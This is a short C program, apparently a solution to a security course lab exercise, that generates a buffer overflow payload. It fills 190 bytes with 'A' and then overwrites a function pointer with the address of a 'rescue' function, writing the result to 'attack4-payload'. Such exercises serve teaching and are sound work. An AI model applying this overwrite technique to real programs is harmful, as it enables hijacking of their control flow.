#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    char inputStr[300];  // Make sure it's large enough to accommodate the input
    unsigned long long rescue_address = 0x804863b;  // Address of the rescue function

    // Calculate the offset to reach functionPtr
    int offset = 190;

    // Fill the inputStr with 'A' to reach the functionPtr
    memset(inputStr, 'A', offset);

    // Overwrite functionPtr with the address of rescue
    *((unsigned long long*)(inputStr + offset)) = rescue_address;

    // Null-terminate the string
    inputStr[offset + sizeof(unsigned long long)] = '\0';
    /* YOUR CODE: Generate buf appropriately */
    write_to_file( "attack4-payload", inputStr , 300, FILE_CLEAR );
    exit(0);
}